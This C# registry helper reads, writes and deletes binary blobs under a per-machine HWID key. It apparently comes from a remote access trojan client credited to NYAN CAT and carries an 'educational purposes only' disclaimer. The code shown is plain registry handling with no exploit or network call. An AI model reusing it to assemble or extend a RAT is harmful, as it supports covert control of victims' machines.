using Client.Handle_Packet;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Client.Helper
{
   public static class SetRegistry
    {
        private static readonly string ID = @"Software\" + Settings.Hwid;

        /*
         * Author       : NYAN CAT
         * Name         : Lime Registry DB
         * Contact Me   : https:github.com/NYAN-x-CAT
         * This program is distributed for educational purposes only.
         */

        public static bool SetValue(string name, byte[] value)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    key.SetValue(name, value, RegistryValueKind.Binary);
                    return true;
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            return false;
        }

        public static byte[] GetValue(string value)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID))
                {
                    object o = key.GetValue(value);
                    return (byte[])o;
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            return null;
        }

        public static bool DeleteValue(string name)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(ID))
                {
                    key.DeleteValue(name);
                    return true;
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            return false;
        }

        public static bool DeleteSubKey()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("", true))
                {
                    key.DeleteSubKeyTree(ID);
                    return true;
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            return false;
        }
    }
}
